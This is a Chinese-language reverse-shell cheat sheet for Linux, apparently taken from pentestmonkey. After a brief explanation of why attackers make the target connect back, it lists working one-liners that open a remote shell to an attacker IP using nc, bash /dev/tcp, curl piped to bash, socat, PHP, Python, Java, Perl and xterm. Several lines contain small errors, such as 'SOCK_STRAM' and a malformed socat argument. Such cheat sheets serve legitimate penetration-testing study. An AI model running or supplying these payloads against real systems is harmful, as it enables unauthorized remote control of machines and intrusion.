# linux 反弹shell

## 原因：

```
1.目标机器的防火墙受限，目标机器只能发送信息，不能接收信息
2.要连接的端口被占用
3.目标在局域网，或者IP在变化，无法直接连接
4.目标机器所处环境未知
```

## 原理：

```
攻击者，在攻击机器上监听端口，目标机器上去，连接攻击机器
```

## 反弹sell

### nc

```shell
攻击机器 监听端口 nc 端口
目标机器 nc 攻击机器ip 端口 -e /bin/bash

攻击机器 nc -lvnp 2333
目标机器 nc 192.168.80.162:2333 -e /bin/bash
```

### bash

```bash
bash -i >& /dev/tcp/攻击机器ip/攻击机器端口 0>&1

攻击机器 nc -lvnp 2333
目标机器 bash -i >& /dev/tcp/192.168.80.162/2333 0>&1
```

### web服务

```shell
攻击机器开启http服务 根目录写入文件 内容位 bash -i >& /dev/tcp/攻击机器ip/攻击机器端口 0>&1   然后监听端口

目标机器访问 攻击机器ip ： curl 攻击机器ip | bash
```

### socat

```shell
socat tcp-connect :攻击机器ip:端口  exec: 'bash li',pty,stderr,setsid,sigint,sane
```

### php

此代码假定 TCP 连接使用文件描述符 3。这适用于我的测试系统。如果不起作用，请尝试 4、5、6...

```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### python

这是在 Linux / Python 2.7 下测试的： 如果使用python3，用python3 -c ….. 就行

```python
python -c "import os,socket,subprocess;s=socket.socket
(socket.AF_INET,socket.SOCK_STRAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
```

### java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### PERL

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton( $i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");} ;'

```

### xterm

最简单的反向 shell 形式之一是 xterm 会话。以下命令应在服务器上运行。它将尝试在 TCP 端口 6001 上连接回您 (10.0.0.1)。

```
xterm -display 10.0.0.1:1
```

捕获传入的 xterm，请启动 X-Server（：1 - 侦听 TCP 端口 6001）。一种方法是使用 Xnest（在您的系统上运行）：

```
Xnest :1
```

您需要授权目标连接到您（命令也在您的主机上运行）：

```
xhost +targetip
```

from :

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet